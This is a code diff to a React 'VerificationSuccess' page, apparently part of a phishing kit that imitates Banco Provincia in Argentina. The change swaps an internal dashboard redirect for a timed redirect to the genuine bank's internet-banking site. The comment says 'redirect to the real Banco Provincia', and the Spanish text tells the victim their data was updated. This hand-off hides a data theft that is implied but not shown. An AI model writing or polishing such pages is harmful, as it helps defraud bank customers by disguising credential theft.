@@ -1,9 +1,7 @@
 import { useEffect, useState } from 'react';
-import { useNavigate } from 'react-router-dom';
 
 export default function VerificationSuccess() {
   const [progress, setProgress] = useState(0);
-  const navigate = useNavigate();
 
   useEffect(() => {
     // Animar el progreso
@@ -17,16 +15,16 @@ export default function VerificationSuccess() {
       });
     }, 30);
 
-    // Redirigir al dashboard después de 8 segundos
+    // Redirigir al Banco Provincia real después de 5 segundos
     const timeout = setTimeout(() => {
-      navigate('/dashboard');
-    }, 8000);
+      window.location.href = 'https://www.bancoprovincia.bancainternet.com.ar/spa/';
+    }, 5000);
 
     return () => {
       clearInterval(interval);
       clearTimeout(timeout);
     };
-  }, [navigate]);
+  }, []);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-green-50 via-white to-teal-50 flex items-center justify-center px-4">
@@ -57,10 +55,10 @@ export default function VerificationSuccess() {
         {/* Mensaje principal */}
         <div className="bg-white rounded-2xl shadow-2xl p-8 mb-6">
           <h1 className="text-4xl font-bold text-center text-gray-900 mb-4">
-            ¡Verificación Completada!
+            ¡Datos Actualizados!
           </h1>
           <p className="text-center text-gray-600 text-lg mb-6">
-            Sus datos han sido actualizados correctamente
+            Sus datos fueron actualizados con éxito
           </p>
 
           {/* Barra de progreso */}
@@ -72,7 +70,7 @@ export default function VerificationSuccess() {
               ></div>
             </div>
             <p className="text-center text-sm text-gray-500 mt-2">
-              Procesando información... {progress}%
+              Redirigiendo a Banca Internet... {progress}%
             </p>
           </div>
 
